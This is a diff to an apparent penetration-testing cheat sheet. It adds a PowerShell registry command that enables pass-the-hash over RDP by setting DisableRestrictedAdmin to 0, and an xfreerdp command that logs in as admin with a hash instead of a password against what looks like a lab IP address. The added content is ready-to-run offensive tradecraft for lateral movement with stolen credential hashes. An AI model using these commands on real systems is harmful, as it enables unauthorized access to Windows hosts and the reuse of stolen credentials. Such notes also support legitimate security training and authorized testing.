@@ -795,9 +795,16 @@ Microsoft Windows [Version 10.0.16299.309]
 C:\Windows\system32>
 ```
 
+enable pass the hash for RDP
+
+```
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+```
+
 ```
 xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
 xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
+xfreerdp /clipboard /async-update /async-input /auto-reconnect /audio-mode:1 -glyph-cache /bpp:8 /network:modem /compression -themes -wallpaper /u:admin /pth:hhhhhhhhh  /cert:ignore /v:10.11.1.000 /workarea
 ```
 
 {% embed url="https://cesidt.medium.com/pass-the-hash-techniques-92e46f28af89" %}
